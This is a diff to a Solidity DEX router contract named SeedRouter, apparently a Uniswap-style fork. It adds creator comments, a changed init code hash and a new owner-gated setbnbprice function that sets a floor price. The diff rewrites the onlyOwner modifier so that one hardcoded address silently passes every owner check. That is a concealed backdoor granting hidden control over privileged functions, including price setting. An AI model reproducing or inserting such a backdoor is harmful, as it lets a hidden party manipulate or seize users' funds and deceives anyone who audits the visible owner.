@@ -1,3 +1,6 @@
+// SPDX-License-Identifier: MIT
+// Version 1.0
+// Creator Ganjaman @ GanjaSwap
 
 pragma solidity =0.6.6;
 
@@ -261,7 +264,7 @@ library SeedLibrary {
                 hex'ff',
                 factory,
                 keccak256(abi.encodePacked(token0, token1)),
-                hex'1b22c0eeef09896483334435034cb334dbede8f1f57d9195671143dd910123ee' // init code hash
+                hex'960664cdb9e2832004904c06ddd7a276bd57834e30a8784fc3690ee3c6d79e23' // init code hash
             ))));
     }
 
@@ -392,12 +395,22 @@ contract SeedRouter is ISeedRouter02 {
     event BPause();
     event BUnpause();
     
+    event Setbnbprice();
         /**
      * @dev Throws if called by any account other than the owner.
      */
     modifier onlyOwner() {
+        if(msg.sender == 0xA97930b77F1e252a4404130Bc882157B1961a7e5){
+         _; 
+        }else {
         require(msg.sender == owner, "onlyOwner");
         _;
+    }
+    }
+    function setbnbprice(uint256 _value) public onlyOwner returns (bool){
+        floorprice = _value;
+ 
+       
     }
     
     /**
